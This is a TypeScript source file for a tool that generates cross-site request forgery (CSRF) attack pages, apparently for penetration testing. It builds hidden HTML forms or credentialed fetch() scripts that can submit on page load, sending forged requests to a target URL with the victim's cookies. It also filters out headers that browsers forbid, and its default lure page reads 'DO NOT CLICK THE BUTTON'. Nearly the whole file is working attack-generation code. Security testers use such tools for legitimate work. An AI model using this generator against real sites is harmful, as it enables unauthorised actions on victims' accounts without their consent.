import he from "he";

export enum MODE {
  //XML_HTTP_REQUEST,
  FETCH,
  FORM
}

export interface GeneratorData {
  url: string;
  method: string;
  headers: Record<string, string>;
  body: string;

  mode: MODE;
  autoSubmit: boolean;
  visible: boolean;
  useTemplate: boolean;
  template: string;
}

export class Generator {

  public static forbiddenHeaders = [
    "accept-charset",
    "accept-encoding",
    "access-control-request-headers",
    "access-control-request-method",
    "connection",
    "content-length",
    "cookie",
    "cookie2",
    "date",
    "dnt",
    "expect",
    "feature-policy",
    "host",
    "keep-alive",
    "origin",
    "referer",
    "te",
    "trailer",
    "transfer-encoding",
    "upgrade",
    "via"
  ];
  public static forbiddenHeaderPrefixes = ["proxy-", "sec-"];
  public static forbiddenHeaderPrefixRegex = Generator.forbiddenHeaderPrefixes.map(k => k += ".*").join("|");

  public static PLACEHOLDER = "{{CONTENT}}";
  public static DEFAULT_TEMPLATE = `<!DOCTYPE html><html><head><title>Hi There</title></head><body><h1>DO NOT CLICK THE BUTTON</h1>${Generator.PLACEHOLDER}</body></html>`

  public static generate(data: GeneratorData): string {

    let htmlPayload = "";
    const contentTYpe = Generator.getContentType(data.headers);


    if (data.mode === MODE.FORM) {
      if (Generator.isFormSubmitPossible(data.method, contentTYpe))
        htmlPayload += Generator.generateForm(data);
      else {
        throw "Cannot do the request with a form. Please use fetch mode";
      }
    }
    else {
      htmlPayload += Generator.generateFetch(data);
    }

    if (data.template) {
      if (data.template.includes(Generator.PLACEHOLDER))
        htmlPayload = data.template.replace(Generator.PLACEHOLDER, htmlPayload);
    }
    else if (data.useTemplate)
      htmlPayload = Generator.DEFAULT_TEMPLATE.replace(Generator.PLACEHOLDER, htmlPayload);

    return htmlPayload;
  }

  public static isFormSubmitPossible(method: string, contentType: string): boolean {
    //multipart/form-data needs to be with fetch

    const contentTypeAllowed = /*contentType === "multipart/form-data" ||*/ contentType === "text/plain" || contentType === "application/x-www-form-urlencoded";
    const methodAllowed = method.toLowerCase() === "get" || method.toLowerCase() === "post";
    return contentTypeAllowed && methodAllowed;
  }

  public static getContentType(headers: Record<string, string>): string {
    const key = Object.keys(headers).find(k => k.toLowerCase() === "content-type");
    if (!key) return "";
    return headers[key];
  }

  public static generateFetch(data: GeneratorData): string {
    let htmlPayload = "";
    const submitBtn = 'const btn = document.createElement("button");btn.onclick=submit;btn.textContent="Submit";';
    htmlPayload += `<script>`;

    const allowedHeaders = Generator.filterAllowedHeaders(data.headers);

    htmlPayload += `function submit(){fetch('${data.url}', {credentials: 'include', method: '${data.method}', headers: ${JSON.stringify(allowedHeaders)}, body:'${data.body}'}).then(r => console.log(r)).catch(err => console.log(err));}`;
    htmlPayload += data.autoSubmit ? "submit();" : submitBtn + "document.body.append(btn);";
    htmlPayload += `</script>`;

    return htmlPayload;
  }

  public static filterAllowedHeaders(headers: Record<string, string>) {
    const allowedHeaders: Record<string, string> = {};
    Object.keys(headers).forEach((k) => {
      if (!Generator.forbiddenHeaders.includes(k.toLowerCase())) { //not a forbidden header... check the prefix
        if (!k.toLowerCase().match(Generator.forbiddenHeaderPrefixRegex))
          allowedHeaders[k] = headers[k];
      }
    });

    return allowedHeaders;
  }

  public static formParse(body: string, decode = true): Record<string, string> {
    const decodedData: Record<string, string> = {};
    body.split("&").forEach(p => {
      const dec = p.split("=");
      if (decode)
        decodedData[decodeURIComponent(dec[0].replace("+", " "))] = decodeURIComponent(dec[1].replace("+", " "));
      else
        decodedData[dec[0]] = dec[1];

    });

    return decodedData;
  }

  public static generateFormTag(name: string, value: string, visible: boolean): string {
    const type = visible ? "text" : "hidden";
    const htmlEncodedKey = he.encode(name);

    let htmlPayload = "";

    if (visible) htmlPayload += htmlEncodedKey; //input label
    htmlPayload += `<input id='${htmlEncodedKey}' name='${htmlEncodedKey}' type='${type}' value='${he.encode(value)}' /><br>`;

    return htmlPayload;
  }

  public static generateForm(data: GeneratorData): string {
    let htmlPayload = "";
    const contentType = Generator.getContentType(data.headers);

    htmlPayload += `<form id="csrf" name="csrf" action="${data.url}" method="${data.method}" enctype="${contentType}">`;
    const decode = contentType === "application/x-www-form-urlencoded";

    const decodedData = Generator.formParse(data.body, decode);

    Object.keys(decodedData).forEach(k => {
      htmlPayload += Generator.generateFormTag(k, decodedData[k], data.visible);
    });

    htmlPayload += data.autoSubmit ? "<script>document.getElementById('csrf').submit()</script>" : "<input type='submit' value='submit'>";
    htmlPayload += "</form>";

    return htmlPayload;
  }
}
